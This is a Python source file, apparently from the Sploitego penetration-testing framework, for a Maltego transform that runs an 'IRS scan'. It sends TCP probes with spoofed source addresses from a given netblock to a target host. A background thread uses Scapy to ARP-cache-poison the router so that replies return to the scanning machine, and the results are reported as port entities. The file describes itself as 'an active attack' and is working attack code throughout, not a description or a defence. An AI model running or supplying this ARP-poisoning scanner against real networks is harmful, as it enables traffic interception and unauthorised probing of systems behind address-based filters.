#!/usr/bin/env python

from optparse import OptionParser
from Queue import Queue, Empty
from threading import Thread
from time import sleep

from scapy.all import Ether, ARP, IP, TCP, ICMP, sendp, srp, RandShort, RandInt
from sploitego.maltego.message import Label, Netblock, IPv4Address
from sploitego.framework import configure, superuser
from sploitego.iptools.ip import iprange, portrange
from common.entities import Port, PortStatus
from sploitego.maltego.utils import debug
from sploitego.config import config

__author__ = 'Nadeem Douba'
__copyright__ = 'Copyright 2012, Sploitego Project'
__credits__ = ['Nadeem Douba']

__license__ = 'GPL'
__version__ = '0.1'
__maintainer__ = 'Nadeem Douba'
__email__ = 'ndouba@gmail.com'
__status__ = 'Development'


__all__ = [
    'onterminate',
    'dotransform'
]

class ArpCachePoisoner(Thread):

    def __init__(self, *args):
        self.mac = args[0]
        self.rmac = args[1]
        self.poison_rate = config['irsscan/poison_rate']
        super(ArpCachePoisoner, self).__init__()

    def run(self):

        debug('ARP cache poisoning thread waiting for victims...')
        ip = q.get()
        debug('Acquired first victim... %s' % ip)

        pe = Ether(src=self.mac, dst=self.rmac)
        pa = ARP(op='is-at', hwsrc=self.mac, psrc=ip, hwdst=self.rmac)

        while True:
            try:
                ip = q.get_nowait()
                if ip is None:
                    break
                else:
                    debug('Changing victim to %s...' % ip)
                    pa.psrc = ip
            except Empty:
                # Send the poison... all your base are belong to us!
                sendp(pe/pa, verbose=0)
                sleep(1/self.poison_rate)


def parse_args(args):
    parser = OptionParser(
        prog=__name__,
        version=__version__,
        description='Spoofs IP range attempting to reach target host via given ports.'
    )
    parser.add_option('-d', dest='target_host', help='Target destination for IRS scan', metavar='host')
    parser.add_option('-p', dest='target_ports', help='Target ports for IRS scan', metavar='p1,p2,pN')
    return parser.parse_args(args)[0]


@superuser
@configure(
    label='To Ports [IRS Scan]',
    description='This transform performs an IRS scan for the given net block. Note: this is an active attack.',
    uuids=[
        'sploitego.v2.NetblockToPort_IRSScan',
        'sploitego.v2.IPv4AddressToPort_IRSScan'
    ],
    inputs=[
        ('Reconnaissance', Netblock),
        ('Reconnaissance', IPv4Address)
    ]
)
def dotransform(request, response):

    params = parse_args(request.params)

    ports = portrange(params.target_ports) if params.target_ports is not None else config['irsscan/target_ports']
    dst = params.target_host if params.target_host is not None else config['irsscan/target_host']

    global q
    q = Queue()

    debug('Sending probes to %s' % dst)

    # This is the template used to send traffic
    p = Ether()/IP(dst=dst, id=int(RandShort()))/TCP(dport=ports, sport=int(RandShort()), seq=int(RandInt()))

    # We need to fix these values so that Scapy doesn't poop all over them
    p.dst = router_mac = p.dst
    p.src = my_mac = p.src

    # Begin the evil... mwuahahahahaha..
    apw = ArpCachePoisoner(my_mac, router_mac)
    apw.start()

    # Loop through our IP address block and send out the probes
    for i in iprange(request.value):

        # Queue and set the current IP we are poisoning for the poisoner.
        q.put(str(i))
        p[IP].src = str(i)
        sleep(0.5)

        # Send the probes!
        ans, unans = srp(
            p,
            retry=config['irsscan/sr_retries'],
            timeout=config['irsscan/sr_timeout'],
            verbose=config['irsscan/sr_verbose']
        )

        if ans:
            for a in ans:
                req, res = a
                e = Port(req.dport)
                e.source = req[IP].src
                e.destination = req[IP].dst
                e.protocol = 'tcp'
                e += Label('Summary', res.summary())
                if TCP in res:
                    e.response = res[TCP].sprintf('TCP:%flags%')
                    e.status = PortStatus.Closed if (res[TCP].flags & 4) else PortStatus.Open
                elif ICMP in res:
                    e.response = res[ICMP].sprintf('ICMP:%type%')
                    e.status = PortStatus.TimedOut
                response += e

        if unans:
            for u in unans:
                e = Port(u.dport)
                e.source = u[IP].src
                e.destination = u[IP].dst
                e.status = PortStatus.TimedOut
                e.response = 'none'
                response += e


    # Goodbye!
    q.put(None)
    apw.join()

    return response


def onterminate(*args):
    debug('Terminated.')
    exit(0)